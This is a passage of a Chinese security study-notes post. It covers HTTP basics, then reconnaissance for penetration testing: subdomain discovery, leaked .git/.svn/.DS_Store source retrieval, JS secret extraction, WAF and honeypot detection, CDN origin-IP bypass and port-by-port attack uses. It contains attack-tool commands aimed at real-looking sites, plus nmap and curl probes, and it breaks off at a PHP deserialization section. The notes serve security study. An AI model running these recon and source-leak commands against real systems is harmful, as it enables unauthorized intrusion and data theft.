Content\n部分内容响应（支持分块下载或断点续传）\nContent-Range: bytes 0-499/2000\n是\n\n\n301\n3xx (重定向)\nMoved Permanently\n资源永久迁移，客户端应更新书签（SEO 权重转移）\nLocation: /new-url\n是\n\n\n302\n\nFound\n资源临时重定向，客户端保持原 URL（不转移 SEO 权重）\nLocation: /temp-url\n否\n\n\n304\n\nNot Modified\n资源未修改，客户端使用缓存（需配合 If-Modified-Since 头）\nETag, Last-Modified\n是\n\n\n307\n\nTemporary Redirect\n临时重定向且要求 HTTP 方法不变（如 POST 请求仍为 POST）\nLocation: /temp-redirect\n否\n\n\n308\n\nPermanent Redirect\n永久重定向且要求 HTTP 方法不变\nLocation: /new-path\n是\n\n\n400\n4xx (客户端错误)\nBad Request\n请求语法错误（如参数缺失、格式无效）\n-\n是\n\n\n401\n\nUnauthorized\n未提供有效身份凭证（需认证）\nWWW-Authenticate: Basic\n是\n\n\n403\n\nForbidden\n权限不足（如用户无权访问资源）\n-\n是\n\n\n404\n\nNot Found\n资源不存在（URL 错误或已删除）\n-\n是\n\n\n408\n\nRequest Timeout\n服务器等待请求超时（客户端发送过慢）\n-\n否\n\n\n429\n\nToo Many Requests\n客户端请求频率超限（触发速率限制）\nRetry-After: 60\n否\n\n\n500\n5xx (服务器错误)\nInternal Server Error\n服务器内部错误（代码异常、配置问题）\n-\n否\n\n\n502\n\nBad Gateway\n网关服务器收到上游无效响应（如 Nginx 后端服务崩溃）\n-\n否\n\n\n503\n\nService Unavailable\n服务暂时不可用（过载或维护）\nRetry-After: 3600\n否\n\n\n504\n\nGateway Timeout\n网关等待上游响应超时（如数据库查询超时）\n\n\n\n\n\n关键特性说明\n1.幂等性\n\n幂等操作（如 GET/PUT/DELETE）：多次重复请求效果相同，客户端可安全重试\n非幂等操作（如 POST）：重复请求可能导致资源重复创建，需谨慎处理\n\n2.重定向类型对比\n\n\n\n特性\n301/308\n302/307\n\n\n\n\n持久性\n永久\n临时\n\n\nSEO 影响\n转移权重\n保留原权重\n\n\n方法保持\n301 可改方法 308 禁止改方法\n302 可改方法 307 禁止改方法\n\n\n\n3.响应头**（Response Headers）**\n\n\n\n关键响应头\n作用\n\n\n\n\nContent-Type: text/html\n响应体类型（如 application/json）\n\n\nSet-Cookie: sessionId=...\n向客户端写入 Cookie（属性：HttpOnly、Secure、SameSite）\n\n\nCache-Control: max-age=3600\n缓存控制策略（如 public、no-cache）\n\n\nLocation: /new-path\n重定向目标地址（配合 3xx 状态码）\n\n\n\n4.响应体**（Response Body）**\n\n内容形式：HTML、JSON、图片等服务器返回的实际数据\n长度标识：Content-Length 或分块传输编码\n\n四、HTTP 方法全集\n\n\n\n方法\n语义\n幂等性\n安全性\n应用场景\n\n\n\n\nGET\n获取资源\n是\n是\n页面加载、API 数据查询\n\n\nPOST\n创建资源\n否\n否\n表单提交、文件上传\n\n\nPUT\n替换整个资源\n是\n否\n全量更新用户信息\n\n\nDELETE\n删除资源\n是\n否\n删除文章\n\n\nPATCH\n部分更新资源\n否\n否\n修改用户昵称\n\n\nHEAD\n获取资源元数据\n是\n是\n检查链接有效性\n\n\nOPTIONS\n查询服务器支持的方法\n是\n是\nCORS 预检请求\n\n\nTRACE\n诊断连接路径\n是\n是\n网络调试\n\n\n\n五、HTTPS 对数据包的影响\n\n加密层：在 HTTP 与 TCP 间插入 TLS/SSL 协议（端口 443），对原始 HTTP 报文加密传输\n报文变化：\n\n明文 → 二进制加密数据（握手阶段协商对称密钥）\n保留 HTTP 语义，但无法直接读取内容（需解密）\n\n\n\n六、协议演进\n1.HTTP/1.1\n\n持久连接（Connection: keep-alive）\n分块传输（Transfer-Encoding: chunked）\n\n2.HTTP/2\n\n二进制分帧：将报文拆分为帧（Frame），多路复用提升效率\n头部压缩：HPACK 算法减少冗余\n\n3.HTTP/3\n\n基于 QUIC 协议（UDP），解决队头阻塞\n\n七、补充\n\n\n\n\n信息打点\n一、Web 应用\n1.Web 单域名\n查询方法：\n\n备案信息\n企业产权\n注册域名\n反查解析\n\n2.Web 子域名\n（1）DNS 数据查询\n\n\n原理：通过解析域名的权威 DNS 记录（NS、MX、TXT、CNAME 等），挖掘隐含的子域名信息。DNS 协议响应中可能暴露管理后台、邮件服务器等关键子域。\n\n\n记录类型分析：\n\nNS记录：权威 DNS 服务器（如 ns1.example.com）\nMX记录：邮件服务器子域（如 mail.example.com）\nTXT记录：可能包含 SPF 策略或隐藏子域线索\n\n\n\n优缺点：\n\n✅ 直接获取权威数据，准确性高\n❌ 依赖 DNS 配置完整性，隐私保护域名信息可能缺失\n\n\n\n（2）证书查询\n\n原理：基于证书透明度（Certificate Transparency, CT）政策，CA 机构公开所有 SSL/TLS 证书信息，证书中常包含主域名关联的子域名\n技术流程：\n\n证书日志聚合平台（如 crt.sh）抓取公开 CT 日志\n解析证书的 Subject Alternative Name (SAN) 字段，提取所有绑定域名\n关联同一组织证书，发现业务子域（如 api.example.com, dev.example.com）\n\n\n适用场景：\n\n发现 HTTPS 服务子域\n追踪证书更新历史中的废弃子域（如测试环境）\n\n\n\n（3）网络空间查询\n\n原理：通过扫描全网 IP 和开放端口，建立“IP-域名-服务”映射关系库，反向关联子域名\n数据关联技术：\n\nIP 反查：同一 IP 可能绑定多个子域名（如 CDN 节点）\n服务指纹识别：根据 HTTP 响应头、页面特征匹配归属组织\nASN 归属分析：通过 IP 段归属企业，推测未公开子域\n\n\n优势：覆盖范围广，可发现非标准 DNS 配置的资产\n\n（4）威胁情报查询\n\n原理：整合公开漏洞库、黑客论坛、恶意软件流量等数据源，提取攻击活动中暴露的子域名\n数据来源：\n\nVirusTotal：恶意文件通信域名、DNS 历史记录\nAlienVault OTX：众包威胁数据中的资产线索\nPassiveDNS：历史 DNS 解析存档（如 SecurityTrails）\n\n\n应用：\n\n发现钓鱼仿冒子域（如 login-example.com）\n定位 C&amp;C 服务器关联域名\n\n\n\n（5）枚举解析\n\n原理：通过字典轮询可能的子域名组合，向 DNS 服务器发起批量查询，筛选有效响应\n\n（6）对比与实战建议\n\n\n\n查询方式\n覆盖深度\n速度\n隐蔽性\n典型场景\n\n\n\n\nDNS 数据\n★★☆\n★★★\n★★☆\n快速获取权威记录\n\n\n证书查询\n★★★\n★★★★\n★★★★\nHTTPS 资产发现\n\n\n网络空间测绘\n★★★★\n★★☆\n★★★★\n全网资产关联分析\n\n\n威胁情报\n★★★☆\n★★★☆\n★★★★★\n对抗攻击溯源\n\n\n枚举解析\n★★★★★\n★☆\n★☆\n深度渗透测试（需授权）\n\n\n\n3.源码获取\n3.1.开源\n\n核心逻辑：开源项目具有普遍性和明显特征，可通过指纹识别快速定位框架类型，找到 cms，进而下载源码。\n实战技巧：\n\n对识别出的 CMS，访问其 /admin/login 等默认路径验证一致性；\n通过 GitHub 搜索特征字符串（如 JS 中的版权信息）定位源码仓库。\n\n\n\n3.2.闭源\n\n\n泄露的原因：\n\n1.从源码本身的特性入口\n2.从管理员不好的习惯入口\n3.从管理员不好的配置入口\n4.从管理员不好的意识入口\n5.从管理员资源信息搜集入口\n\n\n\n常见的 Web 源码泄露及其利用：\n\n\n（1）==git 源码泄露==\n\n\nGit 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 .git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。\n\n\n漏洞利用工具：GitHack\n\n\ngithub 项目地址：https://github.com/lijiejie/GitHack\n\n\n用法示例：GitHack.py http://www.openssl.org/.git/\n\n\n修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问。\n\n\n（2）svn 源码泄露\n\nSVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn/entries 文件，获取到服务器源码。\n漏洞利用工具：Seay SVN 漏洞利用工具\n修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码。\n\n（3）hg  源码泄露\n\nMercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成.hg。\n漏洞利用工具：dvcs-ripper\n用法示例：rip-hg.pl -v -u http://www.example.com/.hg/\n\n（4）cvs 泄露\n\n\nCVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root 以及 CVS/Entries 目录，直接就可以看到泄露的信息。\n\n\n漏洞利用工具：dvcs-ripper\n\n\ngithub 项目地址：https://github.com/kost/dvcs-ripper.git\n\n\n运行示例：rip-cvs.pl -v -u http://www.example.com/CVS/\n\n\n（5）Bazaar/bzr 泄露\n\n\nbzr 也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。\n\n\n运行示例：rip-bzr.pl -v -u http://www.example.com/.bzr/\n\n\n（6）==网站备份压缩文件==\n\n管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。\n常见的备份文件后缀：\n\n.rar\n.zip\n.tar.gz\n.bak\n.txt\n.old\n.temp\n\n\n测试工具用扫描的就行\n\n（7）WEB-INF/web.xml 泄露\n\nWEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应的映射才能访问。\nWEB-INF 主要包含以下文件或目录：\n\n12345WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)\n\n通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。\n\n（8）DS-Store 文件泄露\n\n.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。\ngithub 项目地址：https://github.com/lijiejie/ds_store_exp\n用法示例：ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\n（9）SWP 文件泄露\n\nswp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。\n漏洞利用：直接访问.swp 文件，下载回来后删掉末尾的.swp，获得源码文件。\n\n（10）==GitHub 源码泄露==\n\nGitHub 是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。\n类似的代码托管平台还有很多，人才是最大的漏洞。\nGitHub 深度搜索：\n\n语法组合：in:readme 公司名 + language:php 定位内部项目；\n特征提取：扫描 JS/CSS 中的邮箱、API 密钥，反查员工公开仓库。\n\n\n\n3.3.黑灰产业源码商城\n\n通过谷歌搜索博彩源码商城、约友程序批发的关键词，定位境外平台（如 CodeCanyon 擦边板块）\n\n4.JS 前端架构\n4.1.什么是 JS 渗透测试？\n\n\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\nJS 开发的 WEB 应用和 PHP，JAVA, NET 等区别在于即没有源代码，也可以通过浏览器的\n查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于\nJS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL\n地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。\n\n\n前提：Web 应用可以采用后端或前端语言开发\n\n后端语言：php java python .NET 浏览器端看不到真实的源代码\n前端语言：JavaScript(JS)和 JS 框架 浏览器端看到真实的源代码\n\n\n\n例子：\n\nzblog：核心功能采用 PHP 语言去传输接受\nvue.js：核心功能采用框架语法（JS）传输接受\n\n\n\n4.2. JS 泄漏的攻击面\n1.敏感信息硬编码\n\n凭证泄露：API 密钥、数据库密码、云服务 AK/SK 直接写在 JS 中（如阿里云 OSS 密钥），攻击者可直接调用云服务 API 篡改数据。\n用户隐私：姓名、手机号、身份证号未经脱敏渲染至前端（如某 FM 应用评论模块泄露用户邮箱）。\n测试数据残留：生产环境保留测试账号 Token，导致未授权登录后台\n\n2.接口路径暴露\n\n后台管理路径：JS 注释或配置中遗留调试接口（如 /admin/console、/api/internal），暴露攻击入口。\n未授权 API：前端路由配置泄露无需认证的 API（如数据查询接口），可被爬虫批量利用。\n\n3.系统架构信息\n\n技术栈标识：JS 引入文件路径（如 /static/js/app.js）暴露框架类型（Vue/React）\n版本控制痕迹：.map 文件泄露源码映射，便于逆向分析。\n\n4.3.流行的 JS 框架\n\nVue NodeJS jQuery Angular 等\n\n4.4. JS 开发应用的判定\n\n插件 wappalyzer\n源程序代码简短\n引入多个 js 文件\n一般有/static/js/app.js 等顺序的 js 文件\n一般 cookie 中有 connect.sid\n\n4.5. JS 信息提取技术方法\n1.手工提取\n\n浏览器进行抓包检查\n全局关键字\n\n123456789src=path=method:&quot;get&quot;http.get (&quot;method:&quot;post&quot;http.post (&quot;$.ajaxhttp://service.httpposthttp://service.httpget\n2.半自动提取\n\nBurp Suite 插件：\n\n自带功能：Target-&gt; sitemap-&gt; Engagement tools-&gt; Find scripts (脚本查找敏感信息)\n官方插件：JS Miner、JS Link Finder\n第三方插件：HaE、Unexpected_information\n插件加载器：jython-standalone-2.7.2\n\n\n\n3.自动提取\n\n\n\n工具类型\n代表工具\n功能\n\n\n\n\nURL/子域名提取\nJSFinder、==URLFinder==\n快速爬取 JS 中的接口路径和子域名\n\n\n敏感信息扫描\nHaE、==FindSomething==(浏览器插件)\n标记 JS 中的密钥、手机号、邮箱等敏感数据\n\n\nWebPack 解析\n==Packer-Fuzzer==、jjjjjjs\n解构 Webpack 打包的 JS 文件，提取隐藏接口\n\n\nFUZZ 测试\n==ffuf==\n用 fuzz 爆破更多 JS，对提取的路径进行模糊测试，探测未授权访问\n\n\n\n4.6.高危漏洞案例\n1.后台路径泄露 → 云存储沦陷\n\n某网站 JS 文件泄露后台路径 /admin/config-backup，攻击者访问后获取 OSS 的 AK/SK，最终控制云存储桶删改文件。\n\n2.身份凭证硬编码 → 管理员权限获取\n\n前端 JS 内嵌测试账号 Token，攻击者替换登录包中的 Token 直接进入后台。\n\n3.用户数据无脱敏 → 批量隐私泄露\n\n某平台服务端返回用户身份证号、银行卡号至前端，通过源码查看可爬取全站用户隐私。\n\n5.识别防火墙\n\n\nWAF：Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。\n\n\nWAF 分类：\n\n云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等\n硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品\n软件 WAF：宝塔，安全狗、D 盾等\n代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的\n\n\n\n识别方法：\n\n看图识别：拦截页面，identywaf 项目内置\n识别项目：wafw00f   https://github.com/EnableSecurity/wafw00f\n\n\n\n6.蜜罐\n\n\n概念：蜜罐是一种安全威胁的检测技术，其本质在于引诱个欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队的角度钻研蜜罐识别的方式方法\n\n\n识别：指纹识别，网络空间识别，常用端口，连续端口等。\n\n\n技术分类与特点：\n\n\n\n\n\n类型\n交互层级\n优势与局限\n\n\n\n\n低交互蜜罐\n模拟基础服务响应\n部署简单、低风险，但易被识别（如 Honeyd）。\n\n\n高交互蜜罐\n运行完整 OS/应用\n捕获深度攻击数据，但维护成本高（如 Nepenthes）。\n\n\n\n\n7.CDN 绕过\n一、CDN 介绍\n（1）前置知识\n\n\n传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机\n\n\n普通 CDN：用户访问域名–&gt; CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n带 WAF 的 CDN：用户访问域名–&gt; CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n（2）CDN 的三种配置\n\n配置 1：加速域名-需要启用加速的域名\n配置 2：加速区域-需要启用加速的地区\n配置 3：加速类型-需要启用加速的资源\n\n（3）CDN 核心作用与绕过必要性\n1.CDN 的核心功能\n\n隐藏源站 IP：通过边缘节点代理用户请求，使攻击者无法直接定位真实服务器。\n加速与负载均衡：缓存静态资源，减少源站压力，提升访问速度\n安全防护：集成 WAF、DDoS 防御等能力（如 Cloudflare）\n\n2.为何要绕过 CDN\n\n渗透测试需求：定位真实 IP 以测试源站漏洞（如未修复的 0day）。\n应急响应：当 CDN 节点故障时，需直接访问源站排查问题。\n\n（4）识别\n\nnslookup（不重要）\n多地服务器 ping 判断\n\n二、绕过方法\n1.子域名挖掘\n\n原理：主站启用 CDN，但子域名（如 mail.example.com）常因配置遗漏暴露真实 IP。\n操作：ping 子域名得到不一样的 ip，然后查看备案，如果感觉像，就尝试 host（hosts Administrator）绑定 ip，ping 下主域名，强制解析到那个 ip 上\n\n2.历史 DNS 记录查询（老域名适用）\n\n原理：域名启用 CDN 前的解析记录可能留存于公共数据库。\n工具与平台：\n\nSecurityTrails：查看历史 A 记录，过滤 CDN IP\nViewDNS：提供 10 年内的解析历史\n微步在线：国内域名历史记录精准\n\n\n技巧：优先选择 最早解析的 IP，大概率是源站。\n\n3.SSL 证书反查\n\n原理：同一服务器证书可能关联多个域名，暴露真实 IP。\n操作：\n\n访问 https://example.com 获取证书 HASH。\n在 Censys 搜索 parsed.names: example.com，筛选 IP 归属。\n\n\n优势：绕过 CDN 缓存，直接定位服务器。\n\n4.国外节点访问\n\n原理：企业 CDN 可能未覆盖冷门地区（如南美、非洲），直连源站\n实操：\n\n工具：使用国外 VPS（如 AWS 巴西节点）直接访问目标域名。\n在线平台：tools.ipip.net/cdn.php 模拟全球 Ping 测试。\n\n\n注意：部分 CDN 已支持全球覆盖，需结合其他方法验证。\n\n5.邮件服务溯源\n\n原理：企业邮箱（如 admin@example.com）发送邮件时，邮件头常含源站 IP。\n步骤：\n\n1.触发邮件（密码重置/RSS 订阅）。\n2.查看邮件原文，搜索 Received: 字段：\n\n\n==其他方法==：通过发送错误邮件，让他的真实 ip 给你返回错误的信息，但需要有一个自己的收邮箱的服务器（qq 邮箱等不行）\n\n6.网络空间获取\n\n不准，但可以与自己找到的进行对比验证\n\n7.==全面扫描==\n\n原理：扫描全网 IP，匹配目标特征（如 favicon 哈希、HTTP 标题）\n操作：先确定是什么 cdn 提供服务，然后用纯真库找对应 cdn 大概位置的 ip 范围，然后将网站标题写入进去，进行扫描开放的端口对比信息，拿到真实 ip\n局限：耗时长，易触发安全告警。\n\n8.非标准端口探测\n\n原理：CDN 通常只代理 80/443 端口，SSH(22)、RDP(3389)等端口直连源站\n操作：\n\n1nmap -sS -p22,3389,3306 example.com  # 扫描非Web端口\n\n案例：某银行主站 CDN 防护，但 3389 端口开放且 IP 非 CDN 段，暴露源站.\n\n9.HTTP 标头篡改\n\n原理：篡改 Host 头，诱使 CDN 返回源站错误信息。\n测试命令：\n\n1curl -H &quot;Host: example.com&quot; http://CDN_IP -v\n\n成功标志：返回 404 或源站特有错误页。\n\n10.协议差异绕过\n\n场景：CDN 仅配置 HTTPS 时，访问 HTTP 可能直连源站\n验证：\n\n1curl http://example.com  # 返回真实IP或错误信息\n11.总结\n📊 方法对比与工具推荐\n\n\n\n方法\n适用场景\n工具推荐\n成功率\n操作难度\n\n\n\n\n子域名挖掘\n多子域名企业\nSublist3r + Dig\n★★★★☆\n★★☆☆☆\n\n\n历史 DNS 查询\n运营超 1 年的老域名\nSecurityTrails\n★★★☆☆\n★☆☆☆☆\n\n\n邮件溯源\n自建邮箱系统\n手动触发+邮件头分析\n★★★★☆\n★★☆☆☆\n\n\n国外访问\n未覆盖全球的 CDN\nVPS + cURL\n★★☆☆☆\n★★★☆☆\n\n\n全网扫描\n特征明显的网站\nMasscan + FOFA\n★★★★★\n★★★★☆\n\n\n非标准端口探测\n多端口服务\nNmap\n★★★☆☆\n★★★☆☆\n\n\n\n\n首选组合：子域名挖掘 + 历史DNS查询 + 邮件溯源 覆盖 90%场景。\n高阶突破：特征扫描（favicon/证书）适用于顽固目标。\n\n8.框架组件\n一、基础内容\n\n\n框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制\n\n\n组件：第三方的功能模块（日志记录，数据监控，数据转换等）\n\n\nWeb 架构：\n\n1、最简单最入门的开发模型（功能代码全部手写）\n\n最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写\n\n\n2、结合开发框架的开发模型（以框架为核心实现功能）\n\n第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）\n\n\n3、结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）\n\n第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）\n\n\n\n\n\n二、框架识别特征\npython-开发框架\n\n\nDjango：识别插件，Set-Cookie: expires =\n\n\nFlask：识别插件，Set-Cookie: expires =\n\n\nPHP-开发框架\n\nThinkPHP：\n\n识别插件\nX-Powered-By：ThinkPHP\nCMS 识别到源码体系 TP 开发\n\n\nLaravel：识别插件，Set-Cookie 中特征的格式\nYii：识别插件，Set-Cookie 中特征的格式\n\nJAVA-开发框架\n\nFastjson/Jackson：\n\n在提交 JSON 数据包中修改测试，Fastjson 组件会把 01 解析成 1，Jackson 组件在解析 01 是会抛出异常\nhttps://forum.butian.net/share/1679\nhttps://www.iculture.cc/forum-post/24115.html\n\n\nShiro：\n\n请求包的 cookie 中存在 rememberMe 字段。\n返回包中存在 set-Cookie：==rememberMe = deleteMe==\n请求包中存在 rememberMe = x 时，响应包中存在 rememberMe = deleteMe\n有时候服务器不会主动返回 rememberMe = deleteMe, 直接发包即可，将 Cookie 内容改为 rememberMe = 1，若相应包有 rememberMe = deleteMe，则基本可以确定网站是 apache shiro 搭建的\n\n\nStrusts2：一般使用 struts2 框架后缀带 do 或 action，可以尝试进行利用\nSpringboot：\n\n通过 web 应用程序网页标签的小绿叶图标\n通过 Springboot 框架默认报错页面\n\n\nSolr：一般开放 8983 端口，访问页面也可以探针到\n\n二、主机服务器\n1.端口扫描\n\n\n基础概念：在计算机网络通信中，端口是应用程序或服务用于监听传入连接或发送传出数据的逻辑端点。每个端口都由一个 16 位的数字标识，范围从 0 到 65535\n\n\n端口的重要性：\n\n服务识别：特定端口通常与特定服务关联，例如，80 端口用于 HTTP 服务，443 端口用于 HTTPS 服务，22 端口用于 SSH 服务。通过识别开放端口，我们可以推断目标系统可能提供的功能。\n安全评估：开放了不必要的端口或运行着已知漏洞的服务，都可能成为攻击者的入口。端口扫描是安全审计和渗透测试的第一步。\n网络故障排查：确定服务是否正常运行，可以通过检查其监听的端口状态来判断。\n\n\n\n端口分类：\n\n知名端口(Well-Known Ports)：0-1023，由 IANA(Internet Assigned Numbers Authority)分配和控制，用于常见的网络服务，如 HTTP(80), FTP(21), SSH(22)等。\n注册端口(Registered Ports)：1024-49151，可由用户或应用程序注册，用于特定的应用程序或服务。\n动态/私有端口(Dynamic/Private Ports)：49152-65535，通常由客户端程序随机选择，用于临时通信。\n\n\n\n端口扫描工具：Nmap（综合）、Masscan（快速）、网络空间（方便）\n\n\n\n\n\n端口\n协议\n服务\n渗透用途\n\n\n\n\n20,21\nTCP\nFTP\n匿名上传下载、爆破、嗅探、Windows 提权、远程执行（如 proftpd 1.3.5）、后门利用（如 vsftpd 2.3.4）\n\n\n22\nTCP\nSSH\n爆破、SSHv1 中间人攻击、隧道代理、内网转发、文件传输\n\n\n23\nTCP\nTelnet\n爆破、嗅探（常见于路由器/交换机弱口令）\n\n\n25\nTCP\nSMTP\n邮件伪造、VRFY/EXPN 用户枚举（工具：smtp-user-enum）\n\n\n53\nTCP/UDP\nDNS\n区域传送劫持、DNS 投毒、欺骗、DNS 隧道远控\n\n\n69\nTCP/UDP\nTFTP\n下载重要配置文件（如网络设备配置）\n\n\n80-89, 443\nTCP\nWeb 服务\nWeb 漏洞利用（注入、XSS、框架漏洞）、控制台爆破（如 OWA, VPN, Webmail）\n\n\n110\nTCP\nPOP3\n爆破、嗅探\n\n\n111, 2049\nTCP\nNFS\n权限配置不当导致未授权访问\n\n\n137,139,445\nTCP\nSamba\n爆破、漏洞利用（MS08-067, MS17-010）、嗅探\n\n\n143\nTCP\nIMAP\n爆破 5\n\n\n161\nUDP\nSNMP\n默认团体字符串爆破、内网信息搜集\n\n\n389\nTCP\nLDAP\n注入、匿名访问、弱口令\n\n\n512-514\nTCP\nLinux rexec\n爆破、rlogin 登录\n\n\n873\nTCP\nRsync\n匿名访问、文件上传\n\n\n1194\nTCP\nOpenVPN\n钓取 VPN 账号进入内网\n\n\n1352\nTCP\nLotus\n弱口令、信息泄漏\n\n\n1433\nTCP\nSQL Server\n注入、提权、sa 弱口令爆破\n\n\n1521\nTCP\nOracle\nTNS 协议爆破、注入、反弹 Shell\n\n\n1723\nTCP\nPPTP\n爆破、钓取 VPN 账号\n\n\n2181\nTCP\nZooKeeper\n未授权访问\n\n\n3306\nTCP\nMySQL\n注入、提权、弱口令爆破\n\n\n3389\nTCP\nRDP\nShift 后门（Windows Server 2003 以下）、爆破、MS12-020 漏洞\n\n\n3690\nTCP\nSVN\n源码泄露、未授权访问\n\n\n4848\nTCP\nGlassFish\n弱口令\n\n\n5432\nTCP\nPostgreSQL\n爆破、注入、弱口令\n\n\n5900-5902\nTCP\nVNC\n弱口令爆破\n\n\n5984\nTCP\nCouchDB\n未授权导致的任意指令执行\n\n\n6379\nTCP\nRedis\n未授权访问、弱口令爆破\n\n\n7001-7002\nTCP\nWebLogic\nJava 反序列化、弱口令\n\n\n8080-8089\nTCP\nJenkins/JBoss\n反序列化、控制台弱口令\n\n\n9200,9300\nTCP\nElasticSearch\n远程代码执行（如 CVE-2015-1427）\n\n\n11211\nTCP\nMemcached\n未授权访问（可被用于 DDoS 放大攻击）\n\n\n27017-27018\nTCP\nMongoDB\n爆破、未授权访问\n\n\n50070,50030\nTCP\nHadoop\n默认端口未授权访问（如信息泄露）\n\n\n\n三、APP 应用\n1.信息分类\n\n资产信息：\n\nip-端口服务、域名-Web安全、接口-API安全\n\n\n泄露信息：\n\n邮箱配置、接口配置、oss配置\n\n\n代码信息：\n\nJAVA代码安全问题\n\n\n\n2.获取APP\n\n从名称获取APP信息：爱企查、小蓝本、七麦、==点点==\n\n1234https://www.xiaolanben.com/https://aiqicha.baidu.com/https://www.qimai.cn/https://app.diandian.com/\n\nURL获取APP信息：\n\n查备案信息在搜\n网站上有APP下载\n市场直接搜单位名称\n\n\n\n3.提取技术\n\n三种方式及其表现：\n\n抓包-动态表现\n提取-静态表现&amp;动态调试\n搜索-静态表现\n\n\n\n（1）抓包表现出来的数据\n\n优点：没有误报\n缺点，无法做到完整\n\n（2）反编译从源码中提取数据\n\n优点：数据比较完整\n缺点：有很多无用资产信息\n\n（3）动态调试从表现中提取数据\n\n\n优点：\n\n没有误报，解决不能抓包不能代理的情况\n搞逆向的能看到实时的app调用链等\n\n\n\n缺点：无法做到完整\n\n\n案列：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）\n\n\n原因：那个登录界面是 APP 打包的资源，并没有对外发送数据\n\n\n静态分析工具：\n\nMobsf（也可以动态调试+模拟器）\nAppInfoScanner\n在线平台：https://www.zhihuaspace.cn:8888/、https: / /mogua.co/\n\n\n\n","slug":"网安知识点","date":"2025-07-18T13:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"9481c28de8022105da3986b737672c94","title":"反序列化漏洞","content":"反序列化漏洞\n未对反序列化的输入数据做合法性校验，导致攻击者可以控制反序列化的内容。\n&lt;一&gt;序列化serialize()\n将对象（内存中的数据结构或状态）转换为可存储或传输的格式（字节流、JSON、XML等）。\n1234567891011121314151617class S&#123;    public $test=&quot;pikachu&quot;;&#125;$se=new S(); //创建一个对象serialize($se); //把这个对象进行序列化序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;    O:代表object    1:代表对象名字长度为一个字符    S:对象的名称    1:代表对象里面有一个变量    s:数据类型    4:变量名称的长度    test:变量名称    s:数据类型    7:变量值的长度    pikachu:变量值\n&lt;二&gt;反序列化unserialize()\n就是将序列化后的数据还原为原始对象。然后在接下来的代码中继续使用。\n123$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);echo $u-&gt;test; //得到的结果为pikachu\n序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题\n123456789101112131415161718192021222324常见的几个魔法函数:__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用漏洞举例:class S&#123;    var $test = &quot;pikachu&quot;;    function __destruct()&#123;        echo $this-&gt;test;    &#125;&#125;$s = 